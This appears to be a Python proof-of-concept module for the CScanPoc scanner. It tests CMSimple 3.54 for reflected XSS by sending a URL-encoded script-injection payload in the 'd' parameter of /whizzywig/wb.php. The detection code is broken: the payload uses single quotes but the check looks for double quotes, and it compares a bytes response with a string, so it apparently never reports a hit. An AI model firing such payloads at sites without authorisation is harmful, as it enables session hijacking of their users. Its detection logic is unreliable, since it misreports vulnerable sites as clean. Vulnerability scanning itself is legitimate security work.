# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'CMSimple_0000'  # 平台漏洞编号，留空
    name = 'CMSimple 3.54 /whizzywig/wb.php XSS漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-03-25'  # 漏洞公布时间
    desc = '''
        漏洞文件：Getarticle.CMSimple不正确过滤传递给"/whizzywig/wb.php"脚本的"d" HTTP GET参数数据，
        允许攻击者构建恶意URI，诱使用户解析，可获得敏感Cookie，劫持会话或在客户端上进行恶意操作。  
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-61903'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CMSimple'  # 漏洞应用名称
    product_version = '3.54'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f3fa524c-a195-40b5-9021-611485d86326'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/whizzywig/wb.php?d=%27%3E%3Cscript%3Ealert%28%27bb2%27%29%3C/script%3E'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if '<script>alert("bb2")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
